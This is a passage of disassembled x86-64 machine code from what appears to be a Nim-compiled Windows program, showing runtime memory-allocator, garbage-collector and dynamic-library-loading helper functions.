  401c20:	c3                   	ret

0000000000401c21 <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA>:
  401c21:	53                   	push   %rbx
  401c22:	48 83 ec 30          	sub    $0x30,%rsp
  401c26:	48 89 d3             	mov    %rdx,%rbx
  401c29:	48 8b 52 08          	mov    0x8(%rdx),%rdx
  401c2d:	49 89 cb             	mov    %rcx,%r11
  401c30:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401c35:	e8 ea fe ff ff       	call   401b24 <mappingInsert__SRLfEtcWb2dn0ht85HEwbQsystem>
  401c3a:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
  401c3f:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401c44:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  401c4b:	00 
  401c4c:	48 89 c2             	mov    %rax,%rdx
  401c4f:	48 c1 e2 05          	shl    $0x5,%rdx
  401c53:	48 01 ca             	add    %rcx,%rdx
  401c56:	4d 8d 04 d3          	lea    (%r11,%rdx,8),%r8
  401c5a:	49 8b 90 78 10 00 00 	mov    0x1078(%r8),%rdx
  401c61:	48 85 d2             	test   %rdx,%rdx
  401c64:	48 89 53 10          	mov    %rdx,0x10(%rbx)
  401c68:	74 04                	je     401c6e <addChunkToMatrix__YSJZJgeU5UU2aa8GNvs3WA+0x4d>
  401c6a:	48 89 5a 18          	mov    %rbx,0x18(%rdx)
  401c6e:	ba 01 00 00 00       	mov    $0x1,%edx
  401c73:	49 89 98 78 10 00 00 	mov    %rbx,0x1078(%r8)
  401c7a:	83 e1 1f             	and    $0x1f,%ecx
  401c7d:	48 89 d3             	mov    %rdx,%rbx
  401c80:	48 d3 e3             	shl    %cl,%rbx
  401c83:	89 c1                	mov    %eax,%ecx
  401c85:	41 09 9c 83 14 10 00 	or     %ebx,0x1014(%r11,%rax,4)
  401c8c:	00 
  401c8d:	83 e1 1f             	and    $0x1f,%ecx
  401c90:	48 d3 e2             	shl    %cl,%rdx
  401c93:	41 09 93 10 10 00 00 	or     %edx,0x1010(%r11)
  401c9a:	48 83 c4 30          	add    $0x30,%rsp
  401c9e:	5b                   	pop    %rbx
  401c9f:	c3                   	ret

0000000000401ca0 <GetThreadLocalVars.lto_priv.74>:
  401ca0:	56                   	push   %rsi
  401ca1:	53                   	push   %rbx
  401ca2:	48 83 ec 38          	sub    $0x38,%rsp
  401ca6:	8b 35 fc 7e 02 00    	mov    0x27efc(%rip),%esi        # 429ba8 <globalsSlot__ciXDZu9c27pHpCRMoz4RIgw>
  401cac:	ff 15 da 65 04 00    	call   *0x465da(%rip)        # 44828c <__imp_GetLastError>
  401cb2:	89 c3                	mov    %eax,%ebx
  401cb4:	89 f1                	mov    %esi,%ecx
  401cb6:	ff 15 60 66 04 00    	call   *0x46660(%rip)        # 44831c <__imp_TlsGetValue>
  401cbc:	89 d9                	mov    %ebx,%ecx
  401cbe:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  401cc3:	ff 15 2b 66 04 00    	call   *0x4662b(%rip)        # 4482f4 <__imp_SetLastError>
  401cc9:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  401cce:	48 83 c4 38          	add    $0x38,%rsp
  401cd2:	5b                   	pop    %rbx
  401cd3:	5e                   	pop    %rsi
  401cd4:	c3                   	ret

0000000000401cd5 <nimGC_setStackBottom>:
  401cd5:	53                   	push   %rbx
  401cd6:	48 83 ec 20          	sub    $0x20,%rsp
  401cda:	48 89 cb             	mov    %rcx,%rbx
  401cdd:	e8 be ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  401ce2:	48 8b 48 38          	mov    0x38(%rax),%rcx
  401ce6:	48 85 c9             	test   %rcx,%rcx
  401ce9:	74 0c                	je     401cf7 <nimGC_setStackBottom+0x22>
  401ceb:	48 39 d9             	cmp    %rbx,%rcx
  401cee:	74 0b                	je     401cfb <nimGC_setStackBottom+0x26>
  401cf0:	48 39 cb             	cmp    %rcx,%rbx
  401cf3:	48 0f 4c d9          	cmovl  %rcx,%rbx
  401cf7:	48 89 58 38          	mov    %rbx,0x38(%rax)
  401cfb:	48 83 c4 20          	add    $0x20,%rsp
  401cff:	5b                   	pop    %rbx
  401d00:	c3                   	ret

0000000000401d01 <isOnStack__plOlFsQAAvcYd3nF5LfWzw>:
  401d01:	53                   	push   %rbx
  401d02:	48 83 ec 30          	sub    $0x30,%rsp
  401d06:	48 89 cb             	mov    %rcx,%rbx
  401d09:	e8 92 ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  401d0e:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
  401d13:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  401d1a:	00 00 
  401d1c:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  401d21:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
  401d26:	48 8b 50 38          	mov    0x38(%rax),%rdx
  401d2a:	31 c0                	xor    %eax,%eax
  401d2c:	48 39 d9             	cmp    %rbx,%rcx
  401d2f:	77 06                	ja     401d37 <isOnStack__plOlFsQAAvcYd3nF5LfWzw+0x36>
  401d31:	48 39 da             	cmp    %rbx,%rdx
  401d34:	0f 93 c0             	setae  %al
  401d37:	48 83 c4 30          	add    $0x30,%rsp
  401d3b:	5b                   	pop    %rbx
  401d3c:	c3                   	ret

0000000000401d3d <popSafePoint>:
  401d3d:	48 83 ec 28          	sub    $0x28,%rsp
  401d41:	e8 5a ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  401d46:	48 8b 50 20          	mov    0x20(%rax),%rdx
  401d4a:	48 8b 12             	mov    (%rdx),%rdx
  401d4d:	48 89 50 20          	mov    %rdx,0x20(%rax)
  401d51:	48 83 c4 28          	add    $0x28,%rsp
  401d55:	c3                   	ret

0000000000401d56 <prepareDealloc__fvhnFro5wEfzy879alizcUQ>:
  401d56:	56                   	push   %rsi
  401d57:	53                   	push   %rbx
  401d58:	48 83 ec 28          	sub    $0x28,%rsp
  401d5c:	48 89 ce             	mov    %rcx,%rsi
  401d5f:	e8 3c ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  401d64:	48 89 c3             	mov    %rax,%rbx
  401d67:	48 8b 46 08          	mov    0x8(%rsi),%rax
  401d6b:	48 8b 40 20          	mov    0x20(%rax),%rax
  401d6f:	48 85 c0             	test   %rax,%rax
  401d72:	74 14                	je     401d88 <prepareDealloc__fvhnFro5wEfzy879alizcUQ+0x32>
  401d74:	48 ff 83 98 00 00 00 	incq   0x98(%rbx)
  401d7b:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
  401d7f:	ff d0                	call   *%rax
  401d81:	48 ff 8b 98 00 00 00 	decq   0x98(%rbx)
  401d88:	48 83 c4 28          	add    $0x28,%rsp
  401d8c:	5b                   	pop    %rbx
  401d8d:	5e                   	pop    %rsi
  401d8e:	c3                   	ret

0000000000401d8f <stackSize__0yw8cp0rOgL8i0O5kzzb0g>:
  401d8f:	48 83 ec 28          	sub    $0x28,%rsp
  401d93:	e8 08 ff ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.74>
  401d98:	48 8d 48 38          	lea    0x38(%rax),%rcx
  401d9c:	48 83 c4 28          	add    $0x28,%rsp
  401da0:	e9 59 f8 ff ff       	jmp    4015fe <stackSize__VOU3z9bbtHMYBiCVB5tMX1g>

0000000000401da5 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6>:
  401da5:	48 83 ec 28          	sub    $0x28,%rsp
  401da9:	31 d2                	xor    %edx,%edx
  401dab:	41 b8 00 80 00 00    	mov    $0x8000,%r8d
  401db1:	ff 15 8d 65 04 00    	call   *0x4658d(%rip)        # 448344 <__imp_VirtualFree>
  401db7:	85 c0                	test   %eax,%eax
  401db9:	75 17                	jne    401dd2 <osDeallocPages__dRMEutPSAkbR9b9blNmTzvoQsystem.isra.6+0x2d>
  401dbb:	48 8d 0d 42 a2 00 00 	lea    0xa242(%rip),%rcx        # 40c004 <.rdata+0x4>
  401dc2:	e8 49 68 00 00       	call   408610 <printf>
  401dc7:	b9 01 00 00 00       	mov    $0x1,%ecx
  401dcc:	e8 4f 66 00 00       	call   408420 <exit>
  401dd1:	90                   	nop
  401dd2:	48 83 c4 28          	add    $0x28,%rsp
  401dd6:	c3                   	ret

0000000000401dd7 <rawWrite>:
  401dd7:	57                   	push   %rdi
  401dd8:	53                   	push   %rbx
  401dd9:	48 83 ec 28          	sub    $0x28,%rsp
  401ddd:	45 31 c0             	xor    %r8d,%r8d
  401de0:	48 85 d2             	test   %rdx,%rdx
  401de3:	48 89 cb             	mov    %rcx,%rbx
  401de6:	49 89 d2             	mov    %rdx,%r10
  401de9:	74 15                	je     401e00 <rawWrite+0x29>
  401deb:	48 89 d7             	mov    %rdx,%rdi
  401dee:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
  401df2:	31 c0                	xor    %eax,%eax
  401df4:	f2 ae                	repnz scas (%rdi),%al
  401df6:	48 89 ca             	mov    %rcx,%rdx
  401df9:	48 f7 d2             	not    %rdx
  401dfc:	4c 8d 42 ff          	lea    -0x1(%rdx),%r8
  401e00:	4c 89 d1             	mov    %r10,%rcx
  401e03:	49 89 d9             	mov    %rbx,%r9
  401e06:	ba 01 00 00 00       	mov    $0x1,%edx
  401e0b:	e8 f0 65 00 00       	call   408400 <fwrite>
  401e10:	48 89 d9             	mov    %rbx,%rcx
  401e13:	48 83 c4 28          	add    $0x28,%rsp
  401e17:	5b                   	pop    %rbx
  401e18:	5f                   	pop    %rdi
  401e19:	e9 fa 65 00 00       	jmp    408418 <fflush>

0000000000401e1e <nimRegisterGlobalMarker>:
  401e1e:	48 83 ec 28          	sub    $0x28,%rsp
  401e22:	48 8b 05 17 fd 01 00 	mov    0x1fd17(%rip),%rax        # 421b40 <globalMarkersLen>
  401e29:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
  401e2f:	7e 24                	jle    401e55 <nimRegisterGlobalMarker+0x37>
  401e31:	b9 02 00 00 00       	mov    $0x2,%ecx
  401e36:	ff 15 c4 92 00 00    	call   *0x92c4(%rip)        # 40b100 <__imp___acrt_iob_func>
  401e3c:	48 8d 15 d6 a1 00 00 	lea    0xa1d6(%rip),%rdx        # 40c019 <.rdata+0x19>
  401e43:	48 89 c1             	mov    %rax,%rcx
  401e46:	e8 8c ff ff ff       	call   401dd7 <rawWrite>
  401e4b:	b9 01 00 00 00       	mov    $0x1,%ecx
  401e50:	e8 cb 65 00 00       	call   408420 <exit>
  401e55:	48 8d 15 84 8f 01 00 	lea    0x18f84(%rip),%rdx        # 41ade0 <globalMarkers>
  401e5c:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
  401e60:	48 ff c0             	inc    %rax
  401e63:	48 89 05 d6 fc 01 00 	mov    %rax,0x1fcd6(%rip)        # 421b40 <globalMarkersLen>
  401e6a:	48 83 c4 28          	add    $0x28,%rsp
  401e6e:	c3                   	ret

0000000000401e6f <nimGetProcAddr>:
  401e6f:	41 56                	push   %r14
  401e71:	41 55                	push   %r13
  401e73:	41 54                	push   %r12
  401e75:	55                   	push   %rbp
  401e76:	57                   	push   %rdi
  401e77:	56                   	push   %rsi
  401e78:	53                   	push   %rbx
  401e79:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
  401e80:	4c 8b 2d 0d 64 04 00 	mov    0x4640d(%rip),%r13        # 448294 <__imp_GetProcAddress>
  401e87:	49 89 cc             	mov    %rcx,%r12
  401e8a:	48 89 d5             	mov    %rdx,%rbp
  401e8d:	41 ff d5             	call   *%r13
  401e90:	48 85 c0             	test   %rax,%rax
  401e93:	0f 85 f9 00 00 00    	jne    401f92 <nimGetProcAddr+0x123>
  401e99:	48 8d 7c 24 26       	lea    0x26(%rsp),%rdi
  401e9e:	ba fa 00 00 00       	mov    $0xfa,%edx
  401ea3:	bb 01 00 00 00       	mov    $0x1,%ebx
  401ea8:	48 89 f9             	mov    %rdi,%rcx
  401eab:	e8 12 fb ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  401eb0:	c6 44 24 26 5f       	movb   $0x5f,0x26(%rsp)
  401eb5:	8a 44 1d ff          	mov    -0x1(%rbp,%rbx,1),%al
  401eb9:	84 c0                	test   %al,%al
  401ebb:	74 0f                	je     401ecc <nimGetProcAddr+0x5d>
  401ebd:	88 04 1f             	mov    %al,(%rdi,%rbx,1)
  401ec0:	48 ff c3             	inc    %rbx
  401ec3:	48 81 fb f5 00 00 00 	cmp    $0xf5,%rbx
  401eca:	75 e9                	jne    401eb5 <nimGetProcAddr+0x46>
  401ecc:	c6 44 1c 26 40       	movb   $0x40,0x26(%rsp,%rbx,1)
  401ed1:	be 63 00 00 00       	mov    $0x63,%esi
  401ed6:	41 be 0a 00 00 00    	mov    $0xa,%r14d
  401edc:	48 8d 4e 9d          	lea    -0x63(%rsi),%rcx
  401ee0:	48 81 fe c6 00 00 00 	cmp    $0xc6,%rsi
  401ee7:	76 06                	jbe    401eef <nimGetProcAddr+0x80>
  401ee9:	48 83 c3 03          	add    $0x3,%rbx
  401eed:	eb 13                	jmp    401f02 <nimGetProcAddr+0x93>
  401eef:	48 8d 46 a6          	lea    -0x5a(%rsi),%rax
  401ef3:	48 83 f8 12          	cmp    $0x12,%rax
  401ef7:	76 06                	jbe    401eff <nimGetProcAddr+0x90>
  401ef9:	48 83 c3 02          	add    $0x2,%rbx
  401efd:	eb 03                	jmp    401f02 <nimGetProcAddr+0x93>
  401eff:	48 ff c3             	inc    %rbx
  401f02:	c6 44 1c 27 00       	movb   $0x0,0x27(%rsp,%rbx,1)
  401f07:	48 89 c8             	mov    %rcx,%rax
  401f0a:	31 d2                	xor    %edx,%edx
  401f0c:	49 f7 f6             	div    %r14
  401f0f:	48 89 c8             	mov    %rcx,%rax
  401f12:	83 c2 30             	add    $0x30,%edx
  401f15:	88 14 1f             	mov    %dl,(%rdi,%rbx,1)
  401f18:	48 99                	cqto
  401f1a:	48 ff cb             	dec    %rbx
  401f1d:	49 f7 fe             	idiv   %r14
  401f20:	48 85 c0             	test   %rax,%rax
  401f23:	48 89 c1             	mov    %rax,%rcx
  401f26:	75 df                	jne    401f07 <nimGetProcAddr+0x98>
  401f28:	48 89 fa             	mov    %rdi,%rdx
  401f2b:	4c 89 e1             	mov    %r12,%rcx
  401f2e:	41 ff d5             	call   *%r13
  401f31:	48 85 c0             	test   %rax,%rax
  401f34:	75 5c                	jne    401f92 <nimGetProcAddr+0x123>
  401f36:	48 83 c6 04          	add    $0x4,%rsi
  401f3a:	48 81 fe 2f 01 00 00 	cmp    $0x12f,%rsi
  401f41:	75 99                	jne    401edc <nimGetProcAddr+0x6d>
  401f43:	48 8b 1d b6 91 00 00 	mov    0x91b6(%rip),%rbx        # 40b100 <__imp___acrt_iob_func>
  401f4a:	b9 02 00 00 00       	mov    $0x2,%ecx
  401f4f:	ff d3                	call   *%rbx
  401f51:	48 8d 15 01 a1 00 00 	lea    0xa101(%rip),%rdx        # 40c059 <.rdata+0x59>
  401f58:	48 89 c1             	mov    %rax,%rcx
  401f5b:	e8 77 fe ff ff       	call   401dd7 <rawWrite>
  401f60:	b9 02 00 00 00       	mov    $0x2,%ecx
  401f65:	ff d3                	call   *%rbx
  401f67:	48 89 ea             	mov    %rbp,%rdx
  401f6a:	48 89 c1             	mov    %rax,%rcx
  401f6d:	e8 65 fe ff ff       	call   401dd7 <rawWrite>
  401f72:	b9 02 00 00 00       	mov    $0x2,%ecx
  401f77:	ff d3                	call   *%rbx
  401f79:	48 8d 15 ec a0 00 00 	lea    0xa0ec(%rip),%rdx        # 40c06c <.rdata+0x6c>
  401f80:	48 89 c1             	mov    %rax,%rcx
  401f83:	e8 4f fe ff ff       	call   401dd7 <rawWrite>
  401f88:	b9 01 00 00 00       	mov    $0x1,%ecx
  401f8d:	e8 8e 64 00 00       	call   408420 <exit>
  401f92:	48 81 c4 20 01 00 00 	add    $0x120,%rsp
  401f99:	5b                   	pop    %rbx
  401f9a:	5e                   	pop    %rsi
  401f9b:	5f                   	pop    %rdi
  401f9c:	5d                   	pop    %rbp
  401f9d:	41 5c                	pop    %r12
  401f9f:	41 5d                	pop    %r13
  401fa1:	41 5e                	pop    %r14
  401fa3:	c3                   	ret

0000000000401fa4 <nimLoadLibraryError>:
  401fa4:	56                   	push   %rsi
  401fa5:	53                   	push   %rbx
  401fa6:	48 83 ec 28          	sub    $0x28,%rsp
  401faa:	48 8b 1d 4f 91 00 00 	mov    0x914f(%rip),%rbx        # 40b100 <__imp___acrt_iob_func>
  401fb1:	48 89 ce             	mov    %rcx,%rsi
  401fb4:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fb9:	ff d3                	call   *%rbx
  401fbb:	48 8d 15 ac a0 00 00 	lea    0xa0ac(%rip),%rdx        # 40c06e <.rdata+0x6e>
  401fc2:	48 89 c1             	mov    %rax,%rcx
  401fc5:	e8 0d fe ff ff       	call   401dd7 <rawWrite>
  401fca:	48 89 f1             	mov    %rsi,%rcx
  401fcd:	e8 7f f5 ff ff       	call   401551 <nimToCStringConv.lto_priv.53>
  401fd2:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fd7:	48 89 c6             	mov    %rax,%rsi
  401fda:	ff d3                	call   *%rbx
  401fdc:	48 89 f2             	mov    %rsi,%rdx
  401fdf:	48 89 c1             	mov    %rax,%rcx
  401fe2:	e8 f0 fd ff ff       	call   401dd7 <rawWrite>
  401fe7:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fec:	ff d3                	call   *%rbx
  401fee:	48 8d 15 77 a0 00 00 	lea    0xa077(%rip),%rdx        # 40c06c <.rdata+0x6c>
  401ff5:	48 89 c1             	mov    %rax,%rcx
  401ff8:	e8 da fd ff ff       	call   401dd7 <rawWrite>
  401ffd:	b9 01 00 00 00       	mov    $0x1,%ecx
  402002:	e8 19 64 00 00       	call   408420 <exit>
  402007:	90                   	nop

0000000000402008 <nimRegisterThreadLocalMarker>:
  402008:	48 83 ec 28          	sub    $0x28,%rsp
  40200c:	48 8b 05 ad 8d 01 00 	mov    0x18dad(%rip),%rax        # 41adc0 <threadLocalMarkersLen>
  402013:	48 3d ab 0d 00 00    	cmp    $0xdab,%rax
  402019:	7e 24                	jle    40203f <nimRegisterThreadLocalMarker+0x37>
  40201b:	b9 02 00 00 00       	mov    $0x2,%ecx
  402020:	ff 15 da 90 00 00    	call   *0x90da(%rip)        # 40b100 <__imp___acrt_iob_func>
  402026:	48 8d 15 52 a0 00 00 	lea    0xa052(%rip),%rdx        # 40c07f <.rdata+0x7f>
  40202d:	48 89 c1             	mov    %rax,%rcx
  402030:	e8 a2 fd ff ff       	call   401dd7 <rawWrite>
  402035:	b9 01 00 00 00       	mov    $0x1,%ecx
  40203a:	e8 e1 63 00 00       	call   408420 <exit>
  40203f:	48 8d 15 1a 20 01 00 	lea    0x1201a(%rip),%rdx        # 414060 <threadLocalMarkers>
  402046:	48 89 0c c2          	mov    %rcx,(%rdx,%rax,8)
  40204a:	48 ff c0             	inc    %rax
  40204d:	48 89 05 6c 8d 01 00 	mov    %rax,0x18d6c(%rip)        # 41adc0 <threadLocalMarkersLen>
  402054:	48 83 c4 28          	add    $0x28,%rsp
  402058:	c3                   	ret

0000000000402059 <raiseOutOfMem__mMRdr4sgmnykA9aWeM9aDZlw>:
  402059:	48 83 ec 28          	sub    $0x28,%rsp
  40205d:	b9 02 00 00 00       	mov    $0x2,%ecx
  402062:	ff 15 98 90 00 00    	call   *0x9098(%rip)        # 40b100 <__imp___acrt_iob_func>
  402068:	48 8d 15 5c a0 00 00 	lea    0xa05c(%rip),%rdx        # 40c0cb <.rdata+0xcb>
  40206f:	48 89 c1             	mov    %rax,%rcx
  402072:	e8 60 fd ff ff       	call   401dd7 <rawWrite>
  402077:	b9 01 00 00 00       	mov    $0x1,%ecx
  40207c:	e8 9f 63 00 00       	call   408420 <exit>
  402081:	90                   	nop

0000000000402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>:
  402082:	48 83 ec 28          	sub    $0x28,%rsp
  402086:	41 b9 04 00 00 00    	mov    $0x4,%r9d
  40208c:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
  402092:	48 89 ca             	mov    %rcx,%rdx
  402095:	31 c9                	xor    %ecx,%ecx
  402097:	ff 15 9f 62 04 00    	call   *0x4629f(%rip)        # 44833c <__imp_VirtualAlloc>
  40209d:	48 85 c0             	test   %rax,%rax
  4020a0:	75 05                	jne    4020a7 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem+0x25>
  4020a2:	e8 b2 ff ff ff       	call   402059 <raiseOutOfMem__mMRdr4sgmnykA9aWeM9aDZlw>
  4020a7:	48 83 c4 28          	add    $0x28,%rsp
  4020ab:	c3                   	ret

00000000004020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>:
  4020ac:	56                   	push   %rsi
  4020ad:	53                   	push   %rbx
  4020ae:	48 83 ec 28          	sub    $0x28,%rsp
  4020b2:	48 8b b1 78 28 00 00 	mov    0x2878(%rcx),%rsi
  4020b9:	48 85 f6             	test   %rsi,%rsi
  4020bc:	48 89 cb             	mov    %rcx,%rbx
  4020bf:	74 05                	je     4020c6 <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg+0x1a>
  4020c1:	48 39 16             	cmp    %rdx,(%rsi)
  4020c4:	7d 39                	jge    4020ff <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg+0x53>
  4020c6:	b9 00 10 00 00       	mov    $0x1000,%ecx
  4020cb:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
  4020d0:	e8 ad ff ff ff       	call   402082 <osAllocPages__HMOhWrY1QMa49a2BcJwSDZQsystem>
  4020d5:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  4020da:	48 89 83 78 28 00 00 	mov    %rax,0x2878(%rbx)
  4020e1:	48 81 83 80 28 00 00 	addq   $0x1000,0x2880(%rbx)
  4020e8:	00 10 00 00 
  4020ec:	48 89 70 10          	mov    %rsi,0x10(%rax)
  4020f0:	48 c7 00 e8 0f 00 00 	movq   $0xfe8,(%rax)
  4020f7:	48 c7 40 08 18 00 00 	movq   $0x18,0x8(%rax)
  4020fe:	00 
  4020ff:	48 8b 8b 78 28 00 00 	mov    0x2878(%rbx),%rcx
  402106:	4c 8b 41 08          	mov    0x8(%rcx),%r8
  40210a:	48 29 11             	sub    %rdx,(%rcx)
  40210d:	4e 8d 0c 01          	lea    (%rcx,%r8,1),%r9
  402111:	49 01 d0             	add    %rdx,%r8
  402114:	4c 89 41 08          	mov    %r8,0x8(%rcx)
  402118:	4c 89 c9             	mov    %r9,%rcx
  40211b:	e8 a2 f8 ff ff       	call   4019c2 <nimZeroMem.lto_priv.59>
  402120:	4c 89 c8             	mov    %r9,%rax
  402123:	48 83 c4 28          	add    $0x28,%rsp
  402127:	5b                   	pop    %rbx
  402128:	5e                   	pop    %rsi
  402129:	c3                   	ret

000000000040212a <add__3D9aOyz4rDquPZKBlqn0xig>:
  40212a:	56                   	push   %rsi
  40212b:	53                   	push   %rbx
  40212c:	48 83 ec 38          	sub    $0x38,%rsp
  402130:	48 89 d6             	mov    %rdx,%rsi
  402133:	48 8b 12             	mov    (%rdx),%rdx
  402136:	48 89 cb             	mov    %rcx,%rbx
  402139:	48 3b 12             	cmp    (%rdx),%rdx
  40213c:	74 08                	je     402146 <add__3D9aOyz4rDquPZKBlqn0xig+0x1c>
  40213e:	4c 39 42 10          	cmp    %r8,0x10(%rdx)
  402142:	76 78                	jbe    4021bc <add__3D9aOyz4rDquPZKBlqn0xig+0x92>
  402144:	eb 7c                	jmp    4021c2 <add__3D9aOyz4rDquPZKBlqn0xig+0x98>
  402146:	48 8b 81 c0 30 00 00 	mov    0x30c0(%rcx),%rax
  40214d:	48 85 c0             	test   %rax,%rax
  402150:	75 20                	jne    402172 <add__3D9aOyz4rDquPZKBlqn0xig+0x48>
  402152:	ba 28 00 00 00       	mov    $0x28,%edx
  402157:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  40215c:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  402161:	e8 46 ff ff ff       	call   4020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>
  402166:	4c 8b 44 24 20       	mov    0x20(%rsp),%r8
  40216b:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
  402170:	eb 0a                	jmp    40217c <add__3D9aOyz4rDquPZKBlqn0xig+0x52>
  402172:	48 8b 10             	mov    (%rax),%rdx
  402175:	48 89 91 c0 30 00 00 	mov    %rdx,0x30c0(%rcx)
  40217c:	48 83 bb d8 30 00 00 	cmpq   $0x0,0x30d8(%rbx)
  402183:	00 
  402184:	4c 89 40 10          	mov    %r8,0x10(%rax)
  402188:	48 8d 93 d8 30 00 00 	lea    0x30d8(%rbx),%rdx
  40218f:	4c 89 48 18          	mov    %r9,0x18(%rax)
  402193:	75 0e                	jne    4021a3 <add__3D9aOyz4rDquPZKBlqn0xig+0x79>
  402195:	48 89 93 d8 30 00 00 	mov    %rdx,0x30d8(%rbx)
  40219c:	48 89 93 e0 30 00 00 	mov    %rdx,0x30e0(%rbx)
  4021a3:	48 89 10             	mov    %rdx,(%rax)
  4021a6:	48 89 50 08          	mov    %rdx,0x8(%rax)
  4021aa:	48 c7 40 20 01 00 00 	movq   $0x1,0x20(%rax)
  4021b1:	00 
  4021b2:	48 89 06             	mov    %rax,(%rsi)
  4021b5:	48 83 c4 38          	add    $0x38,%rsp
  4021b9:	5b                   	pop    %rbx
  4021ba:	5e                   	pop    %rsi
  4021bb:	c3                   	ret
  4021bc:	74 0c                	je     4021ca <add__3D9aOyz4rDquPZKBlqn0xig+0xa0>
  4021be:	48 83 c2 08          	add    $0x8,%rdx
  4021c2:	48 89 d9             	mov    %rbx,%rcx
  4021c5:	e8 60 ff ff ff       	call   40212a <add__3D9aOyz4rDquPZKBlqn0xig>
  4021ca:	48 89 f1             	mov    %rsi,%rcx
  4021cd:	e8 60 f5 ff ff       	call   401732 <skew__NJo8pxZdXEAIa7wkHls9cOw>
  4021d2:	90                   	nop
  4021d3:	48 83 c4 38          	add    $0x38,%rsp
  4021d7:	5b                   	pop    %rbx
  4021d8:	5e                   	pop    %rsi
  4021d9:	e9 27 f5 ff ff       	jmp    401705 <split__NJo8pxZdXEAIa7wkHls9cOw_2>

00000000004021de <incl__tSnfTXv7GxXoDyFDm9bvzqg>:
  4021de:	57                   	push   %rdi
  4021df:	56                   	push   %rsi
  4021e0:	53                   	push   %rbx
  4021e1:	48 83 ec 20          	sub    $0x20,%rsp
  4021e5:	4c 89 c6             	mov    %r8,%rsi
  4021e8:	48 89 d7             	mov    %rdx,%rdi
  4021eb:	49 89 c9             	mov    %rcx,%r9
  4021ee:	48 c1 fe 09          	sar    $0x9,%rsi
  4021f2:	48 89 f9             	mov    %rdi,%rcx
  4021f5:	4c 89 c3             	mov    %r8,%rbx
  4021f8:	48 89 f2             	mov    %rsi,%rdx
  4021fb:	e8 7f f6 ff ff       	call   40187f <intSetGet__O3FRrWKKUdi8uRTGxiPdIg>
  402200:	48 85 c0             	test   %rax,%rax
  402203:	75 22                	jne    402227 <incl__tSnfTXv7GxXoDyFDm9bvzqg+0x49>
  402205:	ba 50 00 00 00       	mov    $0x50,%edx
  40220a:	4c 89 c9             	mov    %r9,%rcx
  40220d:	e8 9a fe ff ff       	call   4020ac <llAlloc__ovw3NMWXeZ0Qi9cGYq1E2Tg>
  402212:	40 0f b6 d6          	movzbl %sil,%edx
  402216:	48 8d 14 d7          	lea    (%rdi,%rdx,8),%rdx
  40221a:	48 8b 0a             	mov    (%rdx),%rcx
  40221d:	48 89 08             	mov    %rcx,(%rax)
  402220:	48 89 02             	mov    %rax,(%rdx)
  402223:	48 89 70 08          	mov    %rsi,0x8(%rax)
  402227:	81 e3 ff 01 00 00    	and    $0x1ff,%ebx
  40222d:	ba 01 00 00 00       	mov    $0x1,%edx
  402232:	49 89 d8             	mov    %rbx,%r8
  402235:	48 89 d9             	mov    %rbx,%rcx
  402238:	49 c1 f8 06          	sar    $0x6,%r8
  40223c:	48 d3 e2             	shl    %cl,%rdx
  40223f:	4a 09 54 c0 10       	or     %rdx,0x10(%rax,%r8,8)
  402244:	48 83 c4 20          	add    $0x20,%rsp
  402248:	5b                   	pop    %rbx
  402249:	5e                   	pop    %rsi
  40224a:	5f                   	pop    %rdi
  40224b:	c3                   	ret

000000000040224c <splitChunk2__gSNzk4aToVCSTE1opfEv2A>:
  40224c:	57                   	push   %rdi
  40224d:	56                   	push   %rsi
  40224e:	53                   	push   %rbx
  40224f:	48 83 ec 20          	sub    $0x20,%rsp
  402253:	4c 8b 52 08          	mov    0x8(%rdx),%r10
  402257:	49 8d 1c 10          	lea    (%r8,%rdx,1),%rbx
  40225b:	4d 29 c2             	sub    %r8,%r10
  40225e:	49 89 d1             	mov    %rdx,%r9
  402261:	4c 89 44 24 50       	mov    %r8,0x50(%rsp)
  402266:	4c 89 53 08          	mov    %r10,0x8(%rbx)
  40226a:	4c 8b 5a 08          	mov    0x8(%rdx),%r11
  40226e:	48 8d b9 a8 28 00 00 	lea    0x28a8(%rcx),%rdi
  402275:	48 89 ce             	mov    %rcx,%rsi
  402278:	4c 89 03             	mov    %r8,(%rbx)
  40227b:	48 89 f9             	mov    %rdi,%rcx
  40227e:	48 c7 43 10 00 00 00 	movq   $0x0,0x10(%rbx)
  402285:	00 
  402286:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
  40228d:	00 
  40228e:	49 01 d3             	add    %rdx,%r11
  402291:	4c 89 da             	mov    %r11,%rdx
